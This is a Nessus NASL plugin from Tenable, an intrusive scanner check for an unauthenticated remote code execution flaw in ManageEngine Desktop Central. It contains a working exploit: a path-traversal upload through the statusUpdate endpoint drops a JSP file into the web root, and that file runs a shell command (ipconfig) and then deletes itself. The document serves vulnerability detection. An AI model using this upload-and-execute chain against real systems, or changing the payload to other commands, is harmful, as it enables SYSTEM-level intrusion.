#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(86472);
  script_version("1.6");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");


  script_name(english:"ManageEngine Desktop Central Tools Execution Status Update RCE (intrusive check)");
  script_summary(english:"Uploads a file to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java-based web application that is
affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of ManageEngine Desktop Central running on the remote host
is affected by an unspecified remote code execution vulnerability in
the system tools execution status updates due to a failure to properly
sanitize user-supplied input. A remote, unauthenticated attacker can
exploit this to upload to the remote host files containing arbitrary
code and then execute them with NT-AUTHORITY\SYSTEM privileges.

Note that this plugin tries to upload a JSP file to <DocumentRoot>
(i.e., C:\ManageEngine\DesktopCentral_Server\webapps\DesktopCentral\)
and then fetch it, thus executing the Java code in the JSP file. The
plugin attempts to delete the JSP file after a successful upload and
fetch. The user is advised to delete the JSP file if Nessus fails to
delete it.");
# https://www.manageengine.com/products/desktop-central/remote-code-execution.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?89099720");
# https://www.manageengine.com/desktop-management-msp/remote-code-execution.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?35dc5cab");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ManageEngine Desktop Central 9 build 91050 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/07/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/07/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/10/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:manageengine_desktop_central");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2021 Tenable Network Security, Inc.");

  script_dependencies("manageengine_desktop_central_detect.nbin", "os_fingerprint.nasl");
  script_require_ports("Services/www", 8020, 8383, 8040);
  script_require_keys("installed_sw/ManageEngine Desktop Central");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

# ManageEngine Desktop Central (MEDC) server is known to be installed
# on Windows only.
# Skip non-Windows targets, but will continue if OS is not determined
os = get_kb_item("Host/OS");
if(os && "windows" >!< tolower(os))
  audit(AUDIT_OS_NOT, "Windows");

appname = "ManageEngine Desktop Central";

# Plugin will exit if MEDC not detected on the host
get_install_count(app_name:appname, exit_if_zero:TRUE);

# Branch off each http port
# Plugin will exit if MEDC not detected on this http port
port = get_http_port(default:8020);
install = get_single_install(
  app_name            : appname,
  port                : port
);

dir = install["path"];
install_url =  build_url(port:port, qs:dir);

# This is the JSP file the plugin tries to upload to <DocumentRoot>.
# The plugin will try to delete it later.
file = SCRIPT_NAME - ".nasl" + "-" + port + ".jsp";

# This is the Java code put in the JSP file.
# The code tries to run 'ipconfig' and then delete the JSP file (self-destruction).
postdata =
  '<%@ page import="java.io.*" %>\n' +
  '<%\n' +
  'String output = "";\n' +
  'String s = null;\n' +
  '  try {\n' +
  '     Process p = Runtime.getRuntime().exec("cmd.exe /C ipconfig /all && del ..\\\\webapps\\\\DesktopCentral\\\\' + file + '");\n' +
  '      BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));\n' +
         'while((s = sI.readLine()) != null) {\n' +
         '  output += "\\n"+ s;\n' +
         '}\n' +
      '}\n' +
      'catch(IOException e) {\n' +
      '   e.printStackTrace();\n' +
      '}\n' +
  '%>\n' +
  '\n' +
  '<pre>\n <%=output %>\n </pre>\n';

# Attack vector
url = dir + "/statusUpdate?" +
    "actionToCall=3" +
    "&actions=2" +
    "&domainName=Nessus_dom" +              # Agent domain/workgroup
    "&customerId=1" +         
    "&configDataID=1" +     # This field gets mapped to a collectionID 
    "&computerName=" + this_host_name() +   # Agent host name
    # Status update from system tools on the agent is saved in
    # <DocumentRoot>/server-data/<customerId>/Tools-Log/
    # <collectionID>/<computerName>/<applicationName>/. 
    # This directory gets created if it doesn't exist.
    # The 'applicationName' field is not sanitized and we can take
    # advantage of this fact to avoid creating the aforementioned path. 
    # This makes the plugin less instrusive. 
    "&applicationName=../../../../../" +    # name of the system tool 
    "&fileName=" + file;

res = http_send_recv3(
  port            : port,
  method          : "POST",
  item            : url,
  data            : postdata,
  content_type    : "text/html",
  exit_on_fail    : TRUE
);

# Vulnerable server should return 200
if(res[0] !~ "^HTTP/[0-9.]+ 200")
{
  # Patched server returns 403
  if (res[0] =~ "^HTTP/[0-9.]+ 403")
  {
    audit(AUDIT_WEB_APP_NOT_AFFECTED, "ManageEngine Desktop Central", install_url);
  }
  # Unexpected
  else
  {
    audit(AUDIT_RESP_BAD, port, 'a status update message, return HTTP status: ' + res[0]);
  }
}

req1 = http_last_sent_request();

# Try to fetch our uploaded JSP file. If the file was successfully 
# uploaded, the Java code in it will be executed and the output will
# be sent back in the HTTP response.
#
# The Java code tries to delete the JSP file after running 'ipconfig'
res2 = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "/" + file,
  exit_on_fail : TRUE
);

req2 = http_last_sent_request();

# Vulnerable: see part of output of the 'ipconfig' command 
if ("Subnet Mask" >< res2[2])
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    request    : make_list(req1,req2),
    output     : res2[2],
    generic    : TRUE
  );
}
# Unexpected
else 
  audit(AUDIT_RESP_BAD, port, 'a request to fetch ' + file + ', HTTP response: \n' + res2[0] + res2[1] +res2[2]);
